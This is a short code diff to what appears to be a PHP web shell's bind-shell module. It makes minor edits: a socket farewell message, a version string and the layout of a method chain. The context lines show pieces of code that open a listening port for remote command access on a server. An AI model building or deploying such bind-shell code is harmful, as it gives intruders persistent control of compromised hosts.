@@ -145,7 +145,7 @@ class Bind
 				{
 					if( $sCmd === ':exit' )
 					{
-						socket_write( $rClient, "\r\nDobranoc ;)" );
+						socket_write( $rClient, "\r\nDobranoc ;)\r\n" );
 						socket_close( $rSock );
 						socket_close( $rClient );
 
@@ -213,7 +213,7 @@ class ModuleBind implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.0 2011-06-04 - <krzotr@gmail.com>';
+		return '1.01 2011-09-07 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -273,7 +273,8 @@ DATA;
 			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
 
 			$oProxy = new Bind( $this -> oShell );
-			$oProxy -> setPort( $this -> oShell -> aArgv[0] )
+			$oProxy
+				-> setPort( $this -> oShell -> aArgv[0] )
 				-> get();
 			ob_end_flush();
 			exit ;
